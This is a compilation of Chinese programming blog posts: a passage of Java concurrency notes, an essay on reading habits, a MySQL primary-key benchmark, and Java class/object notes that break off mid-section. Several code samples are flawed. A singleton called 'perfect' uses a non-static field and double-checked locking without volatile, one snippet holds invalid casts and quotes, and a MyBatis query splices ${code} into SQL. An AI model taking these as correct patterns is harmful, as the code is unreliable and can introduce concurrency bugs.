我们自定义的StatelessServlet是无状态对象(没有成员,变量保存数据),在方法体内声明的变量i和factors是本地变量,只有进入到这个方法的执行线程才能访问,变量在其他线程中不是共享的,线程访问无状态对象的方法,不会影响到其他线程访问该对象时的正确性,所以无状态对象是线程安全的.
这里有重要的概念要记好:无状态(成员变量)对象永远是线程安全的
 
3 原子性
在无状态对象中,加入一个状态元素,用来计数,在每次访问对象的方法时执行行自增操作.

public class StatelessServlet implements Servlet {
private long count = 0;

@Override
public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
BigInteger i = extractFromRequest(servletRequest);
BigInteger[] factors = factor(i);
count++;
encodeIntoResponse(servletResponse,factors);
}

 
在单线程的环境下运行很perfect,但是在多线程环境下它并不是线程安全的.为什么呢? 因为count++;并不是原子操作,它是由"读-改-写"三个操作组成的,读取count的值,+1,写入count的值,我们来想象一下,有两个线程同一时刻都执行到count++这一行,同时读取到一个数字比如9,都加1,都写入10,嗯 平白无故少了一计数.
现在我们明白了为什么自增操作不是线程安全的,现在我们来引入一个名词竞争条件.
 
4 竞争条件
**当计算的正确性依赖于运行时相关的时序或者多线程的交替时,会产生竞争条件**.
我对竞争条件的理解就是,**多个线程同时访问一段代码,因为顺序的问题,可能导致结果不正确,这就是竞争条件**.
除了上面的自增,还有一种常见的竞争条件--"检查再运行".
废话不多说,上代码.

/**
 * @author liuboren
 * @Title: RaceCondition
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 15:54
 */
public class RaceCondition {

    private boolean state = false;

    public void test(){
        if (state){
            //做一些事
        }else{
            // 做另外一些事
        }
    }

    public void changeState(){
        if(state == false){
            state = true;
        }else{
            state = false;
        }
    }
}

 
 
代码很简单,test()方法会根据对象的state的状态执行一些操作,如果state是true就做一些操作,如果是false执行另外一些操作,在多线程条件下,线程A刚刚执行test()方法的,线程B可能已经改变了状态值,但其改变后的结果可能对A线程不可见,也就是说线程A使用的是过期值.这可能导致结果的错误.
 
5. 示例: 惰性初始化中的竞争条件
这个例子好,多线程环境下的单例模式.

/**
 * @author liuboren
 * @Title: Singleton
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 16:29
 */
public class Singleton {
    private Singleton singleton;

    private Singleton() {
    }

    public Singleton getSingleton(){
        if(singleton ==null){
               singleton = new Singleton();
                      }
        return singleton;
    }
    
}

 
看这个例子,我们把构造方法声明为private的这样就只能通过getSingleton()来获得这个对象的实例了,先判断这个对象是否被实例化了,如果等于null,那就实例化并返回,看似很完美,在单线程环境下确实可以正常运行,但是在多线程环境下,有可能两个线程同时走到new对象这一行,这样就实例化了两个对象,这可能不是我们要的结果,我们来小小修改一下 

/**
 * @author liuboren
 * @Title: Singleton
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 16:29
 */
public class Singleton {
    private Singleton singleton;

    private Singleton() {
    }

    public Singleton getSingleton(){
        if(singleton ==null){
            synchronized (this) {
                if (singleton == null) {
                    singleton = new Singleton();
                }
            }
        }
        return singleton;
    }
    
}

 
限于篇幅,这里直接改了一个完美版的,之所以不在方法声明 synchronized是为了减少同步快,实现更快的响应.
 
6 复合操作
为了避免竞争条件,必须阻止其他线程访问我们正在修改的变量,让我们可以确保:当其他线程想要查看或修改一个状态时,必须在我们的线程开始之前或者完成之后,而不能在操作过程中
将之前的自增操作改为原子的执行,可以让它变为线程安全的.使用Synchronized(同步)块,可以让操作变为原子的.
我们也可以使用原子变量类,是之前的代码变为线程安全的.

    private final AtomicLong count = new AtomicLong(0);

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        BigInteger i = extractFromRequest(servletRequest);
        BigInteger[] factors = factor(i);
        count.incrementAndGet();
        encodeIntoResponse(servletResponse, factors);
    }

 
 
 
7 锁
 
Java提供关键字Synchronized(同步)块,来保证线程安全,可以在多线程条件下保证可见性和原子性.
可见性: 一个线程修改完对象的状态后,对其他线程可见.
原子性: 可以把复合操作转换为不可再分的原子操作.一个线程执行完原子操作其它线程才能执行同样的原子操作.
让我们看看另一个关于线程安全的结论:当一个不变约束涉及多个变量时,变量间不是彼此独立的:某个变量的值会制约其他几个变量的值.因此,更新一个变量的时候,要在同一原子操作中更新其他几个.
觉得过于抽象?我们来看看实际的代码

/**
 * @author liuboren
 * @Title: StatelessServlet
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 15:04
 */
public class StatelessServlet implements Servlet {
    private final AtomicReference<BigInteger> lastNumber
            = new AtomicReference<>();

    private final AtomicReference<BigInteger[]> lastFactors
            = new AtomicReference<>();


    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        BigInteger i = extractFromRequest(servletRequest);
        if (i.equals(lastNumber.get())) {
            encodeIntoResponse(servletResponse, lastFactors.get());
        } else {
            BigInteger[] factors = factor(i);
            lastFactors.set(factors);
            encodeIntoResponse(servletResponse, lastFactors.get());
/        }
    }

 
 
简单说明一下,AtomicLong是Long和Integer的线程安全holder类,AtommicReference是对象引用的线程安全holder类. 可以保证他们可以原子的set和get.
我们看一下代码,根据lastNumber.get()的结果取返回lastFactors.get()的结果,这里存在竞争条件.因为很有可能线程A执行完lastNumber.set()且还没有执行lastFactors.set()的时候,另一个线程重新调用这个方法进行条件判断,lastNumber.get()取到了最新值,通过判断进行响应,但这时响应的lastFactors.get()却是过期值!!!!
FBI WARNING: 为了保护状态的一致性,要在单一的原子操作中更新相互关联的状态变量.
 
8 内部锁
每个对象都有一个内部锁,执行线程进入synchronized快之前获得锁;而无论通过正常途径退出,还是从块中抛出异常,线程在放弃对synchronized块的控制时自动释放锁.获得内部锁的唯一途径是:进入这个内部锁保护的同步块或方法.
内部锁是互斥锁,意味着至多只有一个线程可以拥有锁,当线程A尝试请求一个被线程B占有的锁时,线程A必须等待或者阻塞,直到B释放它,如果B永远不释放锁,A将永远等待下去
内部锁对提高线程的安全性来说很好,很perfect,but但是,在上锁的时间段其他线程被阻塞了,这会带来糟糕的响应性.
我们再来看之前的单例模式

/**
 * @author liuboren
 * @Title: Singleton
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 16:29
 */
public class Singleton {
    private Singleton singleton;

    private Singleton() {
    }

 /*   public Singleton getSingleton(){
        if(singleton ==null){
            synchronized (this) {
                if (singleton == null) {
                    singleton = new Singleton();
                }
            }
        }
        return singleton;
    }*/

    public synchronized Singleton getSingleton() {
        if (singleton == null) {
            singleton = new Singleton();
        }
        return singleton;
    }
}

 
 
在方法上加synchronized可以保证线程安全,但是响应性不好,上面注解掉的是之前优化后的方法.
 
9 用锁来保护状态
下面列举了一些需要加锁的情况.
1. 操作共享状态的复合操作必须是原子的,以避免竞争条件.例如自增和惰性初始化.
2. 并不是所有数据都需要锁的保护---只有那些被多个线程访问的可变数据.
3. 对于每一个涉及多个变量的不变约束,需要同一个锁保护其所有变量
 
10 活跃度与性能虽然在方法上声明 synchronized可以获得线程安全性,但是响应性变得很感人.
限制并发调用数量的,并非可用的处理器资源,而恰恰是应用程序自身的结构----我们把这种运行方式描述为弱并发的一种表现.
通过缩小synchronized块的范围来维护线程安全性,可以很容易提升代码的并发性,但是不应该把synchronized块设置的过小,而且一些很耗时的操作(例如I/O操作)不应该放在同步块中(容易引发死锁)
决定synchronized块的大小需要权衡各种设计要求,包括安全性、简单性和性能,其中安全性是绝对不能妥协的,而简单性和性能又是互相影响的(将整个方法声明为synchronized很简单,但是性能不太好,将同步块的代码缩小,可能很麻烦,但是性能变好了)
原则:通常简单性与性能之间是相互牵制的,实现一个同步策略时,不要过早地为了性能而牺牲简单性(这是对安全性潜在的妥协).
最后,使用锁的时候,一些耗时非常长的操作,不要放在锁里面,因为线程长时间的占有锁,就会引起活跃度(死锁)与性能风险的问题.
 
嗯,终于写完了.以上是博主<<Java并发编程实战>>的学习笔记,如果对您有帮助的话,请点下推荐,谢谢.
　　 
********************************************************************************************************************************************************************************************************
时间太少，如何阅读？

你有阅读的习惯吗？有自己的阅读框架吗？
...
国庆长假，没有到处跑，闲在家里读读书。看了一下我在豆瓣标记为 “想读” 的书籍已经突破了 300 本，而已标记读过的书才一百多本，感觉是永远读不完了。
好早以前我这个 “想读” 列表是很短的，一般不超过 20 本，因为以前我看见这个列表太长了后，就会主动停止往里面再添加了，直到把它们读完了，这样倒是有助于缓解下这种读不完的压力与焦虑感。
但后来渐渐想明白这个方法其实有很大的弊端，因为这样的处理算法是先进先出的，而更好的选择应该是按优先级队列来的。所以，后来我只要遇到好书，都往列表力放，只是在取的时候再考虑优先级，而不再对队列的长度感到忧虑。
那么从队列中取的时候，优先级算法是如何的呢？这就和每一个人具体的阅读偏好和习惯有关了。而我的阅读习惯简单可以用两个词来概括：聚焦与分层。
我把需要阅读的内容分作 3 个层次：

内层：功利性阅读
中层：兴趣性阅读
外层：探索性阅读

最内层的功利性阅读其实和我们的工作生活息息相关，这样的阅读目的就是为了学会知识或技能，解决一些工作或生活中的问题与困惑。比如，Java 程序员读《Java 核心编程》就属于这类了。
中间层的兴趣性阅读则属于个人兴趣偏好的部分，比如我喜欢读读科幻（今年在重读刘慈欣的各阶段作品）、魔幻（如《冰与火之歌》）和玄幻之类的小说。
最外层的探索性阅读，属于离个人工作和生活比较远的，也没太大兴趣的部分；这部分内容其实就是主动选择走出边界取探索并感受下，也许就可能发现有趣的东西，也可能就有了兴趣。
也许很多人的阅读都有类似的三个层次，但不同的是比例，以及选择的主动与被动性。目前，我在内层功利阅读上的比例最大，占 70%；中层的兴趣阅读约 20%；外层的探索阅读占 10%。这个比例我想不会是固定不变的，只是一定阶段感觉最合适的选择。
有时，招人面试时，最后我总爱问对方：“最近读过什么书？”倒不是真得关心对方读过什么书，其实就是看看有没有阅读的习惯，看看对方是否主动选择去学习和如何有效的处理信息。毕竟阅读的本质就是处理、吸收和消化信息，从读书的选择上可以略窥一二。
让人感叹的是现今能够杀时间的 App 或者节目实在太多，要想真正去认真读点东西对意志力会有些挑战。上面我所说的那个阅读分层，其实都是适用于深度阅读的，它要求你去抵挡一些其他方面的诱惑，把时间花在阅读上。
深度阅读意味着已经完成了内容选择，直接可以进入沉浸式阅读；而在能选择之前，其实就有一个内容收集和沉淀的阶段。平时我都是用碎片时间来完成这个收集和沉淀，为了让这个收集和沉淀发挥的作用更好，其实需要建立更多样化的信息源，以及提升信源的质量。
通过多样化的信源渠道，利用碎片时间广度遍历，收集并沉淀内容；再留出固有的时间，聚焦选择分层阅读内容，进入沉浸阅读；这样一个系统化的阅读习惯就建立起来了，剩下的就交给时间去慢慢积累吧。
...
我的阅读只有一个框架，并没有计划；只管读完当前一本书，下一本书读什么，什么时候读都不知道，只有到要去选择那一刻才会根据当时的状态来决定。
但框架指导了我的选择。

写点文字，画点画儿，记录成长瞬间。
微信公众号「瞬息之间」，既然遇见，不如同行。


********************************************************************************************************************************************************************************************************
【数据库】Mysql中主键的几种表设计组合的实际应用效果
写在前面
        前前后后忙忙碌碌，度过了新工作的三个月。博客许久未新，似乎对忙碌没有一点点防备。总结下来三个月不断的磨砺自己，努力从独乐乐转变到众乐乐，体会到不一样的是，连办公室的新玩意都能引起莫名的兴趣了，作为一只忙碌的 “猿” 倒不知正常与否。
        咳咳， 正题， 今天要写一篇关于mysql的主键、索引的文章，mysql的研究博主进行还不够深入，今天讨论的主题主要是，主键对增删改查的具体影响是什么？ 博主将用具体的实验说明。
         如果你不了解主键，你可以先看看下面的小节，否则你可以直接跳转到实验步骤
了解主键、外键、索引
主键
　　主键的主要作用是保证表的完整、保证表数据行的唯一性质，
     ① 业务主键（自然主键）：在数据库表中把具有业务逻辑含义的字段作为主键，称为“自然主键(Natural Key)”。
   自然主键的含义就是原始数据中存在的不重复字段，直接使用成为主键字段。 这种方式对业务的耦合太强，一般不会使用。
 
     ② 逻辑主键（代理主键）：在数据库表中采用一个与当前表中逻辑信息无关的字段作为其主键，称为“代理主键”。
          逻辑主键提供了一个与当前表数据逻辑无关的字段作为主键，逻辑主键被广泛使用在业务表、数据表，一般有几种生成方式：uuid、自增。其中使用最多的是自增，逻辑主键成功的避免了主键与数据表关联耦合的问题，与业务主键不同的是，业务主键的数据一旦发生更改，那么那个系统中关于主键的所有信息都需要连带修改，这是不可避免的，并且这个更改是随业务需求的增量而不断的增加、膨胀。而逻辑主键与应用耦合度低，它与数据无任何必要的关系，你可以只关心：第一条数据； 而不用关心： 名字是a的那条数据。  某一天名字改成b， 你还是只关心：第一条数据。
         业务的更改几乎是不可避免的，前期任何产品经理言之凿凿的不修改论调都是不可靠、不切实际的。我们必须考虑主键数据在更改的情况下，数据能否平稳度过危机。
 
     ② 复合主键（联合主键）：通过两个或者多个字段的组合作为主键。
    复合主键可以说是业务主键的升级版本，通常一个业务字段不能够确定一条数据的唯一性，例如 张三的身份证是34123322， 张三这种大众名称100%会出现重复。我们可以用姓名 + 身份证的方式表示主键，声明一个唯一的记录。
    有时候，复合主键是复杂的。 姓名+身份证 不一定能表示不重复，虽然身份证在17年消除了重复的问题，但是之前的数据呢？ 可能我们需要新增一个地址作为联合主键，例如 姓名 + 身份证 + 联系地址确认一个人的身份。在其他的业务中，例如访问控制，用户 + 终端 + 终端类型 + 站点 + 页面 + 时间，可能六个字段的联合才能够去确定一个字段的唯一性，这另复杂度陡升。
    另外如果其他表要与该表关联则需要引用复合主键的所有字段，这就不单纯是性能问题了，还有存储空间的问题了，当然你也可以认为这是合理的数据冗余，方便查询，但是感觉有点得不偿失。
 
 　　　使用复合主键的原因可能是：对于关系表来说必须关联两个实体表的主键，才能表示它们之间的关系，那么可以把这两个主键联合组成复合主键即可。
 
 　　　如果两个实体存在多个关系，可以再加一个顺序字段联合组成复合主键，但是这样就会引入业务主键的弊端。当然也可以另外对这个关系表添加一个逻辑主键，避免了业务主键的弊端，同时也方便其他表对它的引用。
 
 
外键
       外键是一种约束，表与表的关联约束，例如a表依赖关联b表的某个字段，你可以设置a表字段外键关联到b表的字段，将两张表强制关联起来，这时候产生两个效果
               ① 表 b 无法被删除，你必须先删除a表
               ② 新增的数据必须与表b某行关联
       这对某些需要强耦合的业务操作来说很有必要，但、 要强调但是，外键约束我认为，不可滥用，没有合适的理由支撑它的使用的话，将导致业务强制耦合。另外对开发人员不够友好。使用外键一定不能超过3表相互。否则将引出很多的麻烦而不得不取消外键。
索引
      索引用于快速找出在某个列中有一特定值的行，不使用索引，MySQL必须从第一条记录开始读完整个表，直到找出相关的行，表越大，查询数据所花费的时间就越多，如果表中查询的列有一个索引，MySQL能够快速到达一个位置去搜索数据文件，而不必查看所有数据，那么将会节省很大一部分时间。
　　例如：有一张person表，其中有2W条记录，记录着2W个人的信息。有一个Phone的字段记录每个人的电话号码，现在想要查询出电话号码为xxxx的人的信息。
　　如果没有索引，那么将从表中第一条记录一条条往下遍历，直到找到该条信息为止。
　　如果有了索引，那么会将该Phone字段，通过一定的方法进行存储，好让查询该字段上的信息时，能够快速找到对应的数据，而不必在遍历2W条数据了。其中MySQL中的索引的存储类型有两种BTREE、HASH。 也就是用树或者Hash值来存储该字段，要知道其中详细是如何查找的，就需要会算法的知识了。我们现在只需要知道索引的作用，功能是什么就行。
        优点：
　　　　1、所有的MySql列类型(字段类型)都可以被索引，也就是可以给任意字段设置索引
　　　　2、大大加快数据的查询速度
　　缺点：
　　　　1、创建索引和维护索引要耗费时间，并且随着数据量的增加所耗费的时间也会增加
　　　　2、索引也需要占空间，我们知道数据表中的数据也会有最大上线设置的，如果我们有大量的索引，索引文件可能会比数据文件更快达到上线值
　　　　3、当对表中的数据进行增加、删除、修改时，索引也需要动态的维护，降低了数据的维护速度。
　　使用原则：
　　　 索引需要合理的使用。
　　　　1、对经常更新的表就避免对其进行过多的索引，对经常用于查询的字段应该创建索引，
　　　　2、数据量小的表最好不要使用索引，因为由于数据较少，可能查询全部数据花费的时间比遍历索引的时间还要短，索引就可能不会产生优化效果。
　　　　3、在一同值少的列上(字段上)不要建立索引，比如在学生表的"性别"字段上只有男，女两个不同值。相反的，在一个字段上不同值较多可是建立索引。
 
测试主键的影响力
       为了说明业务主键、逻辑主键、复合主键对数据表的影响力，博主使用java生成四组测试数据，首先准备表结构为：
       

  `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT,  -- 自增
  `dt` varchar(40) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,     -- 使用uuid模拟不同的id
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,  -- 随机名称
  `age` int(10) NULL DEFAULT NULL,   -- 随机数生成年龄
  `key` varchar(40) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,  -- 唯一标识 使用uuid测试
  PRIMARY KEY (`id`) USING BTREE -- 设置主键


　　将生成四组千万条的数据： 
        1. 自增主键   test_primary_a 
        2. 自增主键  有索引 test_primary_d 
        3. 无主键 无索引 test_primary_b 
        4. 复合主键 无索引 test_primary_c 
       使用java, spring boot + mybatis每次批量一万条数据，插入一千次，记录每次插入时间，总插入时间：
     　mybatis代码：
         

<insert id="insertTestData">
        insert into test_primary_${code} (
        `dt`,
        `name`,
        `age`,
        `key`
        ) values
        <foreach collection="items" item="item"  index= "index" separator =",">
            (
            #{item.dt},
            #{item.name},
            #{item.age},
            #{item.key}
            )
        </foreach>

        java代码，使用了mybatis插件提供的事务处理：

@Transactional(readOnly = false)
   public Object testPrimary (String type) {
       HashMap result = new HashMap();
       // 记录总耗时 开始时间
       long start = new Date().getTime();
       // 记录总耗时 插入条数
       int len = 0;
       try{
           String[] names = {"赵一", "钱二", "张三" , "李四", "王五", "宋六", "陈七", "孙八", "欧阳九" , "徐10"};
           for (int w = 0; w < 1000; w++) {
               // 记录万条耗时
               long startMil = new Date().getTime();

               ArrayList<HashMap> items = new ArrayList<>();
               for (int i = 0; i < 10000; i++) {
                   String dt = StringUtils.uuid();
                   String key = StringUtils.uuid();
                   int age = (int)((Math.random() * 9 + 1) * 10); // 随机两位
                   String name = names[(int)(Math.random() * 9 + 1)];
                   HashMap item = new HashMap<>();
                   item.put("dt", dt);
                   item.put("key", key);
                   item.put("age", age);
                   item.put("name", name);
                   items.add(item);
               }
               len += tspTagbodyMapper.insertTestData(items, type);
               long endMil = new Date().getTime();
               // 万条最终耗时
               result.put(w, endMil - startMil);
           }
           long end = new Date().getTime();
           // 总耗时
           result.put("all", end - start);
           result.put("len", len);
           return result;
       } catch (Exception e) {
           System.out.println(e.toString());
           result.put("e", e.toString());
       }
       return result;
   }

最终生成的数据表情况：
      
        1. 自增主键   test_primary_a  ----------  数据长度  960MB
             62分钟插入一千万条数据  平均一万条数据插入 4秒
 
        2. 自增主键  有索引 test_primary_d    数据长度  1GB    索引长度  1.36GB
            75分钟插入一千万条数据  平均一万条数据插入 4.5秒
 
        3. 无主键 无索引 test_primary_b   -----------   数据长度  960MB
             65分钟插入一千万条数据  平均一万条数据插入 4.2秒
 
        4. 复合主键 无索引 test_primary_c    -----------   数据长度  1.54GB
             219分钟插入一千万条数据 平均一万条数据插入 8秒， 这里有一个问题， 复合主键的数据插入耗时是线性增长的，当数据小于100万 插入时常在五秒左右， 当数据变大，插入时长无限变大，在1000万条数据时，平均插入一万数据秒数已经达到15秒了。
        
 
 查询速度
         注意索引的建立时以name字段为开头，索引的生效第一个条件必须是name
         简单查询：
         select name,age from test_primary_a where age=20   -- 自增主键 无索引 结果条数11万 平均3.5秒
         select name,age from test_primary_a where name='张三' and age=20   -- 自增主键 有索引 结果条数11万 平均650豪秒
         select name,age from test_primary_b where age=20   -- 无主键 无索引 结果条数11万 平均7秒
         select name,age from test_primary_c where age=20    -- 联合主键 无索引 结果条数11万 平均4.5秒
　　　
 
         稍复杂条件：
 
         select name,age,`key`,dt from test_primary_a where age=20 and (name='王五' or name = '张三') and dt like '%abc%'      -- 自增主键 无索引 结果条数198 平均4.2秒
　　  select dt,name,age,`key` from test_primary_d where  (name='王五' or name = '张三') and age=20 and dt like '%abc%'      -- 自增主键 有索引 结果条数204 平均650豪秒
         select name,age,`key`,dt from test_primary_d where age=20 and (name='王五' or name = '张三') and dt like '%abc%'      -- 无主键 无索引 结果条数194 平均5.9秒
         select name,age,`key`,dt from test_primary_c where age=20 and (name='王五' or name = '张三') and dt like '%abc%'      -- 联合主键 无索引 结果条数11万 平均5秒
　　 这样的语句更夸张一点：
         select name,age,dt from test_primary_c where dt like '%0000%' and name='张三'        -- 联合主键 无索引 结果条数359 平均8秒
          select name,age,dt from test_primary_c where dt like '%0000%' and name='张三'        -- 自增主键 有索引 结果条数400 平均1秒
　　　
 
 
初步结论
      从实际应用中可以看出：用各主键的对比，在导入速度上，在前期百万数据时，各表表现一致，在百万数据以后，复合主键的新增时长将线性增长，应该是因为每一条新增都需要判断是否重复，而数据量一旦增大，每次新增都需要全表筛查。
      另外一点，逻辑主键 + 索引的方式占用空间一共2.4G， 复合主键占用1.54G 相差大约1个G ， 但是实际查询效果看起来索引更胜一筹，只要查询方法得当，索引应该是当前的首选。
      最后，关于复合主键的作用？ 我想应该是在业务主键字段不超过2-3个的情况下，需要确保数据维度的唯一性，采取复合主键加上限制。
写在最后
       前后耗时一整天，完成了这次实验过程，目的就是检验几种表设计组合的实际应用效果，关于其他的问题，博主将在后续持续跟进。
        实践出真知。
 
 
********************************************************************************************************************************************************************************************************
类与对象 - Java学习（二）
弄清楚类与对象的本质与基本特征，是进一步学习面向对象编程语言的基本要求。面向对象程序设计与面向过程程序设计在思维上存在着很大差别，改变一种思维方式并不是一件容易的事情。
一、面向对象程序设计
程序由对象组成，对象包含对用户公开的特定功能部分，和隐藏在其内部的实现部分。从设计层面讲，我们只关心对象能否满足要求，而无需过多关注其功能的具体实现。面对规模较小的问题时，面向过程的开发方式是比较理想的，但面对解决规模较大的问题时，面向对象的程序设计往往更加合适。
类
对象是对客观事物的抽象，类是对对象的抽象，是构建对象的模板。由类构造（construct）对象的过程称为创建类的实例（instance）或类的实例化。
封装是将数据和行为组合在一个包中，并对使用者隐藏数据的实现方式。对象中的数据称为实例域（instance field）或属性、成员变量，操纵数据的过程称为方法（method）。对象一般有一组特定的实例域值，这些值的集合就是对象当前的状态。封装的关键在于不让类中的方法直接的访问其他类的实例域，程序仅通过对象的方法与对象数据进行交互。封装能够让我们通过简单的使用一个类的接口即可完成相当复杂的任务，而无需了解具体的细节实现。
对象的三个主要特征

对象的行为（behavior）：可以对对象施加哪些操作，通过方法（method）实现。
对象的状态（state）：存储对象的特征信息，通过实例域（instance field）实现。
对象的标识（identity）：辨别具有不同行为与状态的不同对象。

设计类
传统的面向过程的程序设计，必须从顶部的 main 入口函数开始编写程序。面向对象程序设计没有所谓的顶部，我们要从设计类开始，然后再往每个类中添加方法。那么我们该具体定义什么样的类？定义多少个？每个类又该具备哪些方法呢？这里有一个简单的规则可以参考 —— “找名词与动词”原则。
我们需要在分析问题的过程中寻找名词和动词，这些名词很有可能成为类，而方法对应着动词。当然，所谓原则，只是一种经验，在创建类的时候，哪些名词和动词是重要的，完全取决于个人的开发经验（抽象能力）。
类之间的关系
最常见的关系有：依赖（use-a）、聚合（has-a)、继承（is-a)。可以使用UML（unified modeling language）绘制类图，用来可视化的描述类之间的关系。
二、预定义类与自定义类
在 Java 中没有类就无法做任何事情，Java 标准类库中提供了很多类，这里称其为预定义类，如 Math 类。要注意的是：并非所有类都具有面向对象的特征（如 Math 类），它只封装了功能，不需要也不必要隐藏数据，由于没有数据，因此也不必担心生成以及初始化实例域的相关操作。
要使用对象，就必须先构造对象，并指定其初始状态。我们可以使用构造器（constructor）构造新实例，本质上，构造器是一种特殊的方法，用以构造并初始化对象。构造器的名字与类名相同。如需构造一个类的对象，需要在构造器前面加上 new 操作符，如new Date()。通常，希望对象可以多次使用，因此，需要将对象存放在一个变量中,不过要注意，一个对象变量并没有实际包含一个对象，而仅仅是引用一个对象。
访问器与修改器 我们把只访问对象而不修改对象状态的方法称为 访问器方法（accessor method）。如果方法会对对象本身进行修改，我们称这样的方法称为 更改器方法（mutator method）。
用户自定义类
要想创建一个完成的程序，应该将若干类组合在一起，其中只有一个类有 main 方法。其它类（ workhorse class）没有 main 方法，却有自己的实例域和实例方法，这些类往往需要我们自己设计和定义。
一个源文件中，最多只能有一个公有类（访问级别为public），但可以有任意数目的非公有类。尽管一个源文件可以包含多个类，但还是建议将每一个类存在一个单独的源文件中。 不提倡用public标记实例域（即对象的属性），public 数据域允许程序中的任何方法对其进行读取和修改。当实例域设置为 private 后，如果需要对其进行读取和修改，可以通过定义公有的域访问器或修改器来实现。这里要注意：不要编写返回引用可变对象的访问器方法，如：
class TestClass{
    private Date theDate;
    public getDate(){
        return theDate; // Bad
    }
}
上面的访问器返回的是对实例属性 theDate 的引用，这导致在后续可以随意修改当前实例的 theDate 属性，比如执行x.getDate().setTime(y)，破坏了封装性！如果要返回一个可变对象的引用，应该首先对他进行克隆，如下：
class TestClass{
    private Date theDate;
    public getDate(){
        return (Date) theDate.clone(); // Ok
    }
}
构造器
构造器与类同名，当实例化某个类时，构造器会被执行，以便将实例域初始化为所需的状态。构造器总是伴随着 new 操作符的调用被执行，不能对一个已经存在的对象调用构造器来重置实例域。

构造器与类同名
每个类可以有多个构造器
构造器可以有 0 个或多个参数
构造器没有返回值
构造器总是伴随着 new 操作一起调用

基于类的访问权限
方法可以访问所属类的所有对象的私有数据。[*]
在实现一个类时，应将所有的数据域都设置为私有的。多数时候我们把方法设计为公有的，但有时我们希望将一个方法划分成若干个独立的辅助方法，通常这些辅助方法不应该设计成为公有接口的一部分，最好将其标记为 private 。只要方法是私有的，类的设计者就可以确信：他不会被外部的其他类操作调用，可以将其删去，如果是公有的，就不能将其删除，因为其他的代码可能依赖它。
final 实例域
在构建对象时必须对声明的 final 实例域进行初始化，就是说必须确保在构造器执行之后，这个域的值被设置，并且在后面的操作中，不能够再对其进行修改。final 修饰符大都用于基本类型，或不可变类的域。
静态域和静态方法
静态域和静态方法，是属于类且不属于对象的变量和函数。
通过 static 修饰符，可以标注一个域为静态的，静态域属于类，而不属于任何独立的对象，但是每个对象都会有一份这个静态域的拷贝。静态方法是一种不能对对象施加操作的方法，它可以访问自身类的静态域，类的对象也可以调用类的静态方法，但更建议直接使用类名调用静态方法。
使用静态方法的场景 : 一个方法不需要访问对象状态，其所需参数都是通过显式参数提供；一个方法只需要访问类的静态域。
静态方法还有另外一种常见用途，作为工厂方法用以构造对象。之所已使用工厂方法，两个原因：一是无法命名构造器，因为构造器必须与类名相同；二是当时用构造器时无法改变构造的对象类型。
程序入口 main 方法就是一个典型的静态方法，其不对任何对象进行操作。在启动程序时还没有任何一个对象，静态的 main 方法将执行并创建程序所需要的对象。每个类都可以有一个 main 方法，作为一个小技巧，我们可以通过这个方法对类进行单元测试。
三、方法参数
Java 中的方法参数总是按值调用，也就是说，方法得到的是所有参数的值的一个拷贝，特别是，方法不能修改传递给它的任何参数变量的内容。然而，方法参数有两种类型：基本数据类型和对象引用。
四、对象构造
如果在构造器中没有显式的为域赋值，那么域会被自动的赋予默认值：数值为 0、布尔之为 false、对象引用为 null。在类没有提供任何构造器的时候，系统会提供一个默认的构造器。
有些类有多个构造器，这种特征叫做重载（overloading）。如果多个方法有相同的名字、不同的参数，便产生了重载。 Java 中允许重载任何方法，而不仅是构造器方法。要完整的描述一个方法，需要指出方法名以及其参数类型，这个描述被称作方法的签名。
通过重载类的构造器方法，可以采用多种形式设置类的实例的初始状态。当存在多个构造器的时候，也可以在构造器内部通过 this 调用另一个构造器，要注意的是这个调用必须在当前构造器的第一行：
class Test{
    Test(int number) {
        this(number, (String)number);   // 位于当前构造器的第一行
    }

    Test(int number, String str) {
        _number = number;
        _string = str;
    }
}
初始化块
在一个类的声明中，可以包含多个代码块。只要构造类的对象，这些块就会被执行。例如：
class Test{
    private int number;
    private String name;

    /**
     * 初始化块
     */
    {
        number = 5;
    }

    Test(){
        name = 'Kelsen'
    }

    public void pring(){
        System.out.println(name + "-" + number);
    }
}
执行顺序为，首先运行初始化块，然后再运行构造器的主体部分。这种机制不是必须的，也不常见。通常会直接将初始化代码放在构造器中。
Java 中不支持析构器，它有自动的垃圾回收器，不需要人工进行内存回收。但，如果某个资源需要在使用完毕后立刻被关闭，那么就需要人工来管理。对象用完时可以应用一个 close 方法来完成相应的清理操作。
五、包
借助于包，可以方便的组织我们的类代码，并将自己的代码与别人提供的代码库区分管理。标准的 Java 类库分布在多个包中，包括 java.lang、java.util 和 java.net 等。标准的 Java 包具有一个层次结构。如同硬盘文件目录嵌套一样，也可以使用嵌套层次组织包。所有的标准 Java 包都处于 java 和 javax 包层次中。从编译器角度看，嵌套的包之间没有任何关系，每一个都拥有独立的类集合。
一个类可以使用所属包中的所有类，以及其他包中的公有类（pbulic class）。 import 语句是一种引用包含在包中的类的简明描述。package 与 import 语句类似 C++ 中的 namespace 和 using 指令。
import 语句还可以用来导入类的静态方法和静态域。
如果要将一个类放入包中，就必须将包的名字放在源文件的开头，包中定义类的代码之前。如：

package com.kelsem.learnjava;

public class Test{
    // ...
}
如果没有在源文件中放置 package 语句，这个源文件中的类就被放置在一个默认包中。
包作用域
标记为 private 的部分只能被定义他们的类访问，标记为 public 的部分可以被任何类访问；如果没有指定访问级别，这个部分（类/方法/变量）可以被同一个包中的所有方法访问。
类路径
类存储在文件系统的目录中，路径与包名匹配。另外，类文件也可以存储在 JAR 文件中。为了使类能够被多个程序共享，通常把类放到一个目录中，将 JAR 文件放到一个目录中，然后设置类路径。类路径是所有包含类文件的路径的集合，设置类路径时，首选使用 -calsspath 选项设置，不建议通过设置 CLASSPATH 这个环境变量完成该操作。
六、文档注释
